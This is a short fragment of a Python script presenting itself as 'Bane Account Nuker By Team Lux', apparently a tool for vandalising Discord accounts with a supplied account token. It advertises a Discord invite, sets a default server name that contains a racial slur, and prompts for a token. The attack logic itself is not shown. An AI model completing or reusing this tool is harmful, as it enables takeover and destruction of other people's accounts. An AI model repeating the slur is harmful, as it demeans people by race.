...
{col.LIGHTYELLOW_EX}                        {col.LIGHTYELLOW_EX}Bane Account Nuker By Team Lux                               
{col.LIGHTYELLOW_EX}                        {col.LIGHTYELLOW_EX}discord.gg/GVnFDAc29c                                                                              
...
guildname = "Clapped Bitch Nigga" #guildname for bane
##################SETTINGS################### 
if bane == True:
    print(st.BRIGHT+col.RED+f"bane is enabled.") 
if not token:
    token = input("Token: ")
